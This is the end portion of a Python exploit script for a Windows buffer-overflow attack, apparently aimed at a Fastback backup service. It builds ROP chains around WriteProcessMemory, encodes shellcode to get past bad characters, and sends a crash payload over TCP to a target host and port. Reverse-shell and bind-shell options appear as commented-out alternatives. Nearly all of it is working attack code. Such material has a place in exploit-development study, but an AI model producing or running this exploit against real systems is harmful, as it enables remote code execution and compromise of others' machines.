        # ADD PROGRAM SPECIFIC CODE HERE
        return

# Main
def main(argv):
    # Set up the argument parser
    parser = argparse.ArgumentParser(description="A script to handle socket operations with optional reverse host and port.")  
    # Required positional arguments (e.g., for host and port)
    parser.add_argument("host", type=str, help="The host address to connect to.")
    parser.add_argument("port", type=int, help="The port to connect to.")
    # Optional arguments for reverse host and port
    parser.add_argument("--revhost", "-rh", type=str, default=None, help="The reverse host address (optional).")
    parser.add_argument("--revport", "-rp",type=int, default=None, help="The reverse port (optional). ")
    # Optional argument for timeout
    parser.add_argument("--timeout", "-t", type=int, default=5, help="Set the timeout for socket operations (default is 5 seconds).")
    # Parse the arguments
    args = parser.parse_args()

    # Globals
    global host, port
    global timeout
    global sock

    # Vars
    host = args.host
    port = args.port
    revhost = args.revhost
    revport = args.revport

    ### ADD VARS HERE ###
    intmainbaseaddr = 0x0
    intwpmaddr = 0x0
    intbaselib = 0x0
    lenbadscchars = 0x0  
    lenropdecoder = 0x0
    lenbadscchars = 0x0
    
    ###############
    ### OFFSETS ###
    ###############
    # Offset to main library
    offsetk32wpm = 0x43b10
    offsetlibfunction = 0x13230
    offsetwinmain = 0x66BC56
    
    # Libeay specific offsets
    offsetscretaddr = 0x92c0e # Originally 0x92c00, but contains bad char
    offsetwritable = 0xe401c
    
    # Offsets for encoding/decoding shellcode bad chars
    offsetEncoding = 0x44
    offsetDecoding = -offsetEncoding
    
    # ROP offset var initialize
    payloadoffsetsc = 0x0    
    ropskeloffsetlpbuf = 0x0
    ropdecoderoffseteax = 0x0
    ropskelalign = 0x0

    ###################################
    ### SHELLCODE CHECKS AND COLORS ###
    ###################################
    print(Colors.BOLD + "[*] SHELLCODE BAD CHAR MAPPING AND ENCODING\n" + Colors.END)
    # Shellcode selection
    # selectedsc = Shellcode.asmrevshellShellcode(revhost,revport)
    # selectedsc = Shellcode.asmbindshellcode(revport)
    selectedsc = Shellcode.msflocalmsgShellcode()
    # Map badchars and convert shellcode
    encodedsc = Helpers.mapandconvertShellcode(selectedsc,offsetEncoding)

    # Variable and ROP parameter lengths    
    print(Colors.BOLD + "[*] BUFFER VARS\n" + Colors.END)
    lenbadscchars = len(Shellcode.mappedbadscchars)
    lenropchainwpm = len(ROP.chainWriteProcessMemory(intbaselib,ropskeloffsetlpbuf,payloadoffsetsc,ropdecoderoffseteax)*4)
    lenropscdecoder = len(ROP.chainscDecoder(intbaselib,encodedsc,offsetDecoding)*4)
    lenropskelalign = len(ROP.chainropskelAlign(intbaselib,ropskelalign)*4)
    # Define a fixed width for alignment
    width = 4
    print(f"[*] Length shellcode                {len(selectedsc):<{width}} / {hex(len(selectedsc))}")
    print(f"[*] Length badchars shellcode       {lenbadscchars:<{width}} / {hex(lenbadscchars)}")
    print(f"[*] Length ROP chain WPM:           {lenropchainwpm:<{width}} / {hex(lenropchainwpm)}")
    print(f"[*] Length ROP shellcode decoder:   {lenropscdecoder:<{width}} / {hex(lenropscdecoder)}")
    print(f"[*] Length ROP skeleton align:      {lenropskelalign:<{width}} / {hex(lenropskelalign)}")

    try:
        ######################       
        ### LEAK ADDRESSES ###
        ######################
        print(Colors.BOLD + "\n[*] LEAKING ADDRESSES...\n" + Colors.END)
        #intwpmaddr = Program.leakmodAddr("Kernel32",b"WriteProcessMemory")
        #intbaselib = Program.leakmodAddr("Libmoduledll",b"FUNCTION",offsetlibfunction)
        
        ###########
        ### ROP ###
        ###########
        # Example ASCII representation of ROP vars in payload
        # ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        #          [Filler and header]      [ROP skeleton]         [Filler]             [Stackpivot]           [ROP chain]       [ROP shellcode decoder]      [ROP align EAX decoder]        [Filler]         [Encoded shellcode]     [Filler]
        # OFFSET:       (0x0)        <-->      (0xEC)       <-->                  <-->    (0x140)     <-->       (0x144)     <-->        (0x1E0)         <-->                        <-->                  <-->   (0x1004)    <-->  (Until 0x4000)                                                                                
        # SIZE:         (0x0)        <-->       (0x10)      <-->                  <-->     (0x4)      <-->       (0x9c)      <-->       (DYNAMIC)        <-->         (0x10)         <-->    (DYNAMIC)     <-->   (DYNAMIC)   <-->   (Dynamic)
        # VALUE:  <FILLER + HEADER>  <-->     <ROPSKELWPM>  <-->  <FILLER CHARS>  <-->  <STACKPIVOT>  <-->    <ROPCHAINWPM>  <-->  <ROPCHAINSCDECODER>   <-->  <ROPCHAINSKELALIGN>   <-->  <FILLER CHARS>  <-->  <SHELLCODE>  <-->  <FILLER CHARS>
        # TYPE:        <static>      <-->      <static>     <-->   <static>       <-->    <static>    <-->       <static>    <-->       <DYNAMIC>        <-->        <static>        <-->    <DYNAMIC>     <-->   <DYNAMIC>   <-->   <DYNAMIC>
        # ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
        # VARS:                               <intwpmaddr>                              <stackpivot>          <intbaselib>             <intbaselib>                 <intbaselib>                                 <encodedsc>
        #                                   <offsetscretaddr>                                                <payloadoffsetsc>         <encodedsc>                 <ropskelalign>
        #                                   <offsetwritable>                                               <ropskeloffsetlpbuf>      <offsetDecoding>
        #                                                                                                  <ropdecoderoffseteax>
        #                                                                                                                                         

        # Update ROP offset vars based on leaked addresses
        payloadoffsetsc = 0xeb8                                                         # Offset to first character of shellcode
        ropskeloffsetlpbuf = -(payloadoffsetsc + 0x50)                                  # Offset to first value in ROP skeleton to replace
        ropdecoderoffseteax = -(payloadoffsetsc + 0x4b)                                 # Offset to first char of shellcode, minus one; Fastback specific
        ropskelalign = -(payloadoffsetsc + Shellcode.mappedbadscchars[-1] + 0x5f)       # Offset to ropskel function, calculated on last shellcode badbyte occurence

        # Update ROP chains
        ropskelwpm_gadgets = ROP.wpmSkeleton(intwpmaddr,intbaselib,offsetscretaddr,offsetwritable)
        ropskelwpm = b''.join(pack('<L',_) for _ in ropskelwpm_gadgets)
        ropchainwpm_gadgets = ROP.chainWriteProcessMemory(intbaselib,payloadoffsetsc,ropskeloffsetlpbuf,ropdecoderoffseteax)
        ropchainwpm = b''.join(pack('<L',_) for _ in ropchainwpm_gadgets)
        ropchainscdecoder_gadgets = ROP.chainscDecoder(intbaselib,encodedsc,offsetDecoding)
        ropchainscdecoder = b''.join(pack('<L',_) for _ in ropchainscdecoder_gadgets)
        ropchainskelalign_gadgets = ROP.chainropskelAlign(intbaselib,ropskelalign)
        ropchainskelalign = b''.join(pack('<L',_) for _ in ropchainskelalign_gadgets)

        ### ROP CHECK FOR BADCHARS ###
        # Add all gadgets to chain to check for badchars
        check_badchar_ropchains = [
            ropskelwpm_gadgets,
            ropchainwpm_gadgets,
            ropchainscdecoder_gadgets,
            ropchainskelalign_gadgets,
        ]   
        
        # DEBUG ROP CHAINS
        #for rop in ropchainwpm_gadgets:
        #    print(hex(rop))
        
        # Check ROP for bad characters
        print(Colors.BOLD + "\n[*] CHECKING ROP CHAINS..." + Colors.END)
        for chain in check_badchar_ropchains:
            chainname = [key for key, value in locals().items() if value == chain]
            print(Colors.BOLD + "[*] " + chainname[0] + Colors.END)
            for rop in chain:
                hexRop = Helpers.toByteHex(hex(rop))
                if Helpers.containsBadchars(hexRop):
                    print("[!] Bad character in ROP chain")
                    exit(-1)
                              
        ###########################################                       
        ### CRASH / EIP OVERWRITE FUNCTION HERE ###
        ###########################################
        print(Colors.BOLD + "\n[*] SENDING CRASH PAYLOAD...\n" + Colors.END)
        # Create socket
        sock = Network.TCP.creategsocktcp(host,port)
        # Send data
        paylCrash = Payload.poccrash(intbaselib,ropskelwpm,ropchainwpm,ropchainscdecoder,ropchainskelalign,encodedsc)
        # Send EIP/CRASH
        Network.TCP.sendrecvsocktcp(paylCrash)
        # Close socket
        sock.close()
    except Exception:
        traceback.print_exc()
        sys.exit(0)
    except KeyboardInterrupt:
        Helpers.keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
